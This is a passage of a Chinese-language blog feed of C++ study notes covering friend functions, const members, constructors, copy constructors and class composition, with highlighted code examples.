类为例，如果我们需要一个函数来计算两点之间的距离怎么办？</p><p>将其设置为类外的普通函数并不能反映函数与点之间的联系，也无法直接使用点坐标；</p><p>将其设置为类内的成员函数则不符合类代表一种事物特征的抽象，因为距离代表的是点之间的关系，而不是点的特征。</p><blockquote><p>在<ahref="https://hustlixiang21.github.io/2022/07/20/CPP类和对象/">classcomposition</a>中，有一个 Point 和 Line 类，Line类有一个计算线段长度的函数。但如果我们面对许多点并且频繁需要计算任意两点之间的距离，我们是否每次都需要构造一个Line 类？这显然非常麻烦。</p></blockquote><p>友元关系提供了不同类或对象的成员函数之间，以及类成员函数与普通函数之间的数据共享机制。</p><p>在类中，使用关键字<strong>friend</strong>来声明函数为友元函数，类为友元类。<strong>友元类的所有函数都是友元函数</strong>。</p><h2 id="友元函数">友元函数</h2><p>这些是<strong>在类中用关键字</strong>friend**修饰的非成员函数。它们可以是普通函数或其他类的成员函数。在友元函数的函数体内，可以通过对象名称访问类的私有和保护成员。</p><p>在 github 上有<ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/Point_distance(friend)/main.cpp">实践源代码</a>。</p><h2 id="友元类">友元类</h2><p>类似于友元函数。如果类 A 是类 B 的友元类，则类 A 的所有成员函数都是类B 的友元函数，可以访问类 B 的私有和保护成员。</p><p>特别注意 ⚠️：</p><ul><li>友元关系是<strong>不传递的</strong>。如果 B 是 A 的友元，C 是 B的友元，C <strong>不是 A 的友元</strong>，除非明确声明。</li><li>友元关系是<strong>单向的</strong>。如果 B 是 A 的友元，B 可以访问A，但 A 不能访问 B。</li><li>友元关系是<strong>不继承的</strong>。如果 B 是 A 的友元，B的派生类不会自动成为 A的友元。一个简单的类比是：如果有人信任你的父亲，他们不一定会信任你。</li></ul><h1 id="共享数据保护">共享数据保护</h1><h2 id="常量对象">常量对象</h2><p>常量对象的数据值成员在整个对象生命周期内不能更改。<strong><u>常量对象必须初始化，不能更新。</u></strong></p><div class="note warning flat"><p>在定义时指定初始值称为初始化，通过赋值操作进行的后续更改称为赋值。<strong>不要将初始化与赋值混淆</strong>！</p></div><h2 id="用-const-修饰的类成员">用 const 修饰的类成员</h2><h3 id="常量成员函数">常量成员函数</h3><p>声明格式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">type_specifier <span class="title">function_name</span><span class="params">(parameter_list)</span> <span class="type">const</span></span>;</span><br></pre></td></tr></table></figure><p>注意 ⚠️：</p><ul><li>如果对象是常量对象，则只能通过该常量对象调用常量成员函数，<strong>其他成员函数不能被调用</strong>！这是C++对常量对象的保护，也是常量对象的<strong>唯一外部接口方法</strong>。</li><li>无论是否通过常量对象调用，在调用常量成员函数期间，目标对象被视为常量对象。因此，常量成员函数不能更新目标对象的数据成员，也不能调用该类中未用const修饰的成员函数（确保常量成员函数不修改目标对象的数据成员值）。</li><li>const 关键字可以用于区分重载函数（同名但有或没有 const的函数是不同的函数）。</li></ul><h3 id="常量数据成员">常量数据成员</h3><p>用 const声明的数据成员是常量数据成员，任何函数都不能给它们赋值。构造函数只能通过初始化列表为这些数据成员获取初始值。</p><div class="note info flat"><p>类成员中的静态变量和常量应在类定义外部定义，但 C++提供了一个例外：如果类的静态常量具有整数类型或枚举类型，则可以直接在类定义中指定常量值。</p></div><h3 id="常量引用">常量引用</h3><p>如果在声明时用 const修饰引用，则声明的引用是常量引用，常量引用所引用的对象不能被更新。当用作函数参数时，可以防止意外更改实际参数。</p><blockquote><p>对于在函数中不能更改值的参数，不适合使用普通引用传递，因为这会阻止<strong>常量对象的传递</strong>。使用值传递或传递常量引用可以避免这个问题。值传递更耗时，因此传递常量引用更好。拷贝构造函数的参数通常也选择常量引用！</p></blockquote><h1 id="多文件结构和编译预处理命令">多文件结构和编译预处理命令</h1><p>由于 C 语言有基础，本节仅列出一些不熟悉和不易记忆的内容。</p><h2 id="c-程序的一般组织结构">C++ 程序的一般组织结构</h2><p>一个项目可以分为多个源文件：</p><ul><li>类声明文件（.h 文件）</li><li>类实现文件（.cpp 文件）</li><li>类使用文件（包含 main() 的 .cpp 文件）</li></ul><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-22%2000.16.36.png" /></p><h2 id="标准-c-库">标准 C++ 库</h2><p>标准 C++ 类库是一组极其灵活和可扩展的可重用软件模块。</p><p>标准 C++ 类和组件逻辑上分为 6 种类型：</p><ul><li>输入/输出类<br /></li><li>容器类和抽象数据类型</li><li>存储管理类</li><li>算法</li><li>错误处理</li><li>运行时环境支持</li></ul><h1id="综合示例个人银行账户管理程序">综合示例——个人银行账户管理程序</h1><p>程序源代码已上传至 <ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management">github</a>，并使用<ahref="https://hustlixiang21.github.io/2022/06/19/Makefile入门/">makefile</a>编译。</p><div class="note danger flat"><p>严重错误：静态变量未在外部赋初值，导致我的进度停滞了两个小时，初始化赋值是在定义类成员函数的文件中完成的。</p></div>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Classes and Objects</title>
      <link href="/zh/2022/07/20/CPP/C++%20Classes%20and%20Objects/"/>
      <url>/zh/2022/07/20/CPP/C++%20Classes%20and%20Objects/</url>
      
        <content type="html"><![CDATA[<h1 id="类与对象">类与对象</h1><h2 id="面向对象编程的基本特征">面向对象编程的基本特征</h2><p><strong>抽象</strong></p><ul><li>概括同一类对象的共同属性和行为，形成一个类。<ul><li>首先关注问题的本质和描述，然后是实现过程或细节。</li><li>数据抽象：描述某一类对象的属性或状态（区分对象的物理量）。</li><li>代码抽象：描述某一类对象所具有的共同行为特征或功能。</li><li>抽象的实现：类。</li></ul></li><li>抽象示例—时钟<ul><li>数据抽象： int hour,int minute,int second</li><li>代码抽象： setTime(),showTime()</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">   <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr /><p><strong>封装</strong></p><ul><li>将抽象的数据和代码封装在一起，形成一个类。<ul><li>目的：增强安全性，简化编程。用户不需要了解具体的实现细节，只需通过具有特定访问权限的外部接口使用类成员。</li><li>封装的实现：类声明中的 {}</li></ul></li><li>示例：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>: <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">          <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>: <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr /><p><strong>继承</strong></p><ul><li>在现有类的基础上扩展，形成新类。</li></ul><hr /><p><strong>多态</strong></p><ul><li>多态：同名，不同功能实现。</li><li>目的：实现统一的行为识别，减少程序中的标识符数量。</li></ul><hr /><h2 id="类与对象的定义">类与对象的定义</h2><h3 id="类定义的语法形式">类定义的语法形式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">class_name</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="title">members</span> <span class="params">(external interface)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">private</span>:</span></span><br><span class="line"><span class="function">                private members</span></span><br><span class="line"><span class="function">    protected:</span></span><br><span class="line"><span class="function">                protected members</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><hr /><h3 id="类内初始值">类内初始值</h3><ul><li>可以为数据成员提供类内初始值</li><li>创建对象时，使用类内初始值初始化数据成员</li><li>没有初始值的成员将被默认初始化</li></ul><hr /><h3 id="类成员访问控制">类成员访问控制</h3><ul><li>公有类型成员<ul><li>在 public关键字后声明，它们是类与外部之间的接口，任何外部函数都可以访问公有类型的数据和函数</li></ul></li><li>私有类型成员<ul><li>在 private关键字后声明，只有该类中的函数可以访问，外部函数无法访问。</li><li>如果私有成员在类名后立即声明，可以省略关键字<strong>private</strong></li></ul></li><li>保护类型成员<ul><li>类似于私有，区别在于在继承和派生过程中对派生类的影响不同</li></ul></li></ul><hr /><h3 id="类成员函数">类成员函数</h3><ul><li>在类中声明函数原型</li><li>可以在类外提供函数体实现，并在函数名前加上类名</li><li>也可以直接在类中提供函数体，形成内联成员函数</li><li>允许声明重载函数和具有默认参数值的函数</li></ul><hr /><h3 id="类与对象的程序示例">类与对象的程序示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成员函数实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对象使用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Clock myClock;</span><br><span class="line">    myClock.<span class="built_in">setTime</span>(<span class="number">8</span>,<span class="number">30</span>,<span class="number">30</span>);</span><br><span class="line">    myClock.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><h2 id="构造函数与析构函数">构造函数与析构函数</h2><h3 id="构造函数">构造函数</h3><h4 id="构造函数的目的">构造函数的目的</h4><p>在创建对象时使用特定值构造对象，<strong>初始化</strong>对象为特定初始状态。</p><blockquote><p>当希望构造一个 Clock 类对象并将初始时间设置为 0:0:0时，可以通过构造函数进行设置。</p></blockquote><hr /><h4 id="构造函数的形式">构造函数的形式</h4><ul><li>函数名与类名相同</li><li>不能定义返回类型，且不能有返回语句</li><li>可以有形式参数或没有形式参数</li><li>可以是内联函数</li><li>可以重载</li><li>可以有默认参数值</li></ul><hr /><h4 id="构造函数调用的时机">构造函数调用的时机</h4><p>在创建对象时自动调用</p><hr /><h4 id="构造函数示例">构造函数示例</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS);<span class="comment">//构造函数</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;;<span class="comment">//这里有一个分号</span></span><br><span class="line"><span class="comment">//构造函数实现</span></span><br><span class="line">Clock::<span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS): <span class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="comment">//成员函数实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对象使用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Clock <span class="title">c</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span>;<span class="comment">//自动调用构造函数</span></span><br><span class="line">    c.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><blockquote><p>:: 符号是作用域解析运算符，表示函数定义需要使用 class_name::来限定成员函数。</p></blockquote><div class="note warning flat"><p>非常重要的一点是，类定义结束后有一个分号！！！（浪费了很多时间）</p></div><hr /><h4 id="默认构造函数">默认构造函数</h4><ul><li>可以不带实际参数调用的构造函数<ul><li>参数列表为空的构造函数</li><li>所有参数都有默认值的构造函数</li></ul></li><li>以下两个都是<strong>默认构造函数</strong>。如果它们同时出现在一个类中，将会发生编译错误：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>();</span><br><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH=<span class="number">0</span>,<span class="type">int</span> newM=<span class="number">0</span>,<span class="type">int</span> newS=<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 两个函数都不需要初始值，因此会发生调用冲突</span></span><br></pre></td></tr></table></figure><hr /><h4 id="隐含生成的构造函数">隐含生成的构造函数</h4><p>如果程序中未定义构造函数，编译器将在需要时自动生成一个<strong>默认构造函数</strong></p><ul><li>参数列表为空，不为数据成员设计初始值</li><li>如果类内定义了成员的初始值，则使用类内定义的初始值</li><li>如果没有定义类内的初始值，则以默认方式初始化</li><li>基本类型的数据默认初始化的值是不确定的</li></ul><hr /><h4 id="default">“=default”</h4><p>如果类内已定义构造函数，默认情况下编译器不再隐含生成默认构造函数。如果你坚持希望隐含生成默认构造函数，用“=default”</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>() = <span class="keyword">default</span>;<span class="comment">//指示编译器提供默认构造函数</span></span><br></pre></td></tr></table></figure><hr /><h4 id="委托构造函数">委托构造函数</h4><p>委托构造函数（delegatingconstructor）使用类其他构造函数执行初始化过程</p><p>例如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS):<span class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="built_in">Clock</span>():<span class="built_in">Clock</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)&#123;&#125;</span><br><span class="line"><span class="comment">//有的编译器并不支持委托构造函数</span></span><br></pre></td></tr></table></figure><hr /><h3 id="复制构造函数">复制构造函数</h3><p>复制构造函数是一种特殊的构造函数，其形参为本类的对象引用。作用是用一个已存在的对象去初始化同类型的新对象。</p><p>用法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        类名(形参);<span class="comment">//构造函数</span></span><br><span class="line">        类名(<span class="type">const</span> 类名&amp;对象名);<span class="comment">//复制构造函数</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line">类名::类(<span class="type">const</span> 类名&amp;对象名)<span class="comment">//复制构造函数的实现</span></span><br><span class="line">&#123;函数体&#125;</span><br></pre></td></tr></table></figure><hr /><h4 id="隐含的复制构造函数">隐含的复制构造函数</h4><ul><li>如果没有为类声明拷贝初始化构造函数，则编译器自己生成一个复制构造函数。</li><li>这个构造函数执行的功能是：用作为初始值对象的每个数据成员的值，初始化将要建立的对象的对应数据成员。</li></ul><hr /><h4 id="delete">“=delete”</h4><p>如若不希望被复制构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point(const Point&amp;p) = delete;</span><br></pre></td></tr></table></figure><hr /><h4 id="复制构造函数被调用的三种情况">复制构造函数被调用的三种情况</h4><ul><li>定义一个对象时，以另一个对象作为初始值，发生复制构造</li><li>如果函数的形参是类的对象，调用函数时，将使用实参对象初始化形参对象，发生复制构造</li><li>如果函数的返回值是类的对象，函数执行完成返回主函数时，将使用return语句中的对象初始化一个临时无名对象，传递给主函数，此时发生复制构造</li></ul><hr /><h3 id="析构函数">析构函数</h3><p>作用：完成对象被删除前的一些清理工作</p><ul><li>在对象生存期结束的时刻系统自动调用它，然后再释放此对象所属的空间</li><li>如果程序中未声明析构函数，编译器会自动生成一个默认的析构函数，函数体为空</li></ul><hr /><h2 id="类的组合">类的组合</h2><p>简单来说，就是类的数据成员是其他类的对象，下面用计算两点之间线段的距离的程序来说明。</p><hr /><h3 id="线段类和点类实例">线段类和点类实例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Point类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy); <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(); <span class="comment">//默认构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(Point &amp;p); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getX</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> x;&#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getY</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> y;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">float</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy):<span class="built_in">x</span>(xx),<span class="built_in">y</span>(yy)&#123;&#125; <span class="comment">//构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>():<span class="built_in">x</span>(<span class="number">0</span>),<span class="built_in">y</span>(<span class="number">0</span>)&#123;&#125; <span class="comment">//默认构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>(Point &amp;p) <span class="comment">//复制构造函数的定义</span></span><br><span class="line">&#123;</span><br><span class="line">    x=p.x;</span><br><span class="line">    y=p.y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Point&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Line类，类的组合，计算两点之间的距离</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Line</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Line</span>(Point o1,Point o2); <span class="comment">//参数为Point对象的构造函数</span></span><br><span class="line">    <span class="built_in">Line</span>(Line &amp;l); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getLen</span><span class="params">()</span></span>; <span class="comment">//外部接口</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Point p1,p2;</span><br><span class="line">    <span class="type">float</span> len=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Line::<span class="built_in">Line</span>(Point o1,Point o2):<span class="built_in">p1</span>(o1),<span class="built_in">p2</span>(o2) <span class="comment">//构造函数是每一个成员变量都要初始化的</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x=p<span class="number">1.</span><span class="built_in">getX</span>()-p<span class="number">2.</span><span class="built_in">getX</span>();</span><br><span class="line">    <span class="comment">//此处并不能够直接写  p1.x - p2.x 因为x属于私有变量</span></span><br><span class="line">    <span class="comment">// 通过两个public成员函数可以访问，相当于提供了外部接口</span></span><br><span class="line">    <span class="type">float</span> y=p<span class="number">1.</span><span class="built_in">getY</span>()-p<span class="number">2.</span><span class="built_in">getY</span>();</span><br><span class="line">    len= <span class="built_in">sqrt</span>(x*x+y*y);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">Line::<span class="built_in">Line</span>(Line &amp;l): <span class="built_in">p1</span>(l.p1),<span class="built_in">p2</span>(l.p2) <span class="comment">//复制构造函数是每一个成员变量都需要进行复制的 且这个&#x27;.&#x27;只能够在类的作用域内使用。</span></span><br><span class="line">&#123;</span><br><span class="line">    len=l.len;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Line::getLen</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> len;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">myp1</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span>,<span class="title">myp2</span><span class="params">(<span class="number">4</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="function">Line <span class="title">line</span><span class="params">(myp1,myp2)</span></span>; <span class="comment">//参数传递的时候也需要复制构造哦</span></span><br><span class="line">    <span class="function">Line <span class="title">line2</span><span class="params">(line)</span></span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line is &quot;</span> &lt;&lt; line.<span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line2 is &quot;</span> &lt;&lt; line<span class="number">2.</span><span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr /><h3 id="前向引用声明">前向引用声明</h3><p>遇到两个类相互引用的情况，也称为循环依赖，简单理解就是你不能使用一个在前面完全没有出现过的标识符。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>;            <span class="comment">//前向引用声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;            <span class="comment">//A类的定义</span></span><br><span class="line"><span class="keyword">public</span>:              <span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(B b)</span></span>;      <span class="comment">//以B类对象b为形参的成员函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;            <span class="comment">//B类定义</span></span><br><span class="line"><span class="keyword">public</span>:              <span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span 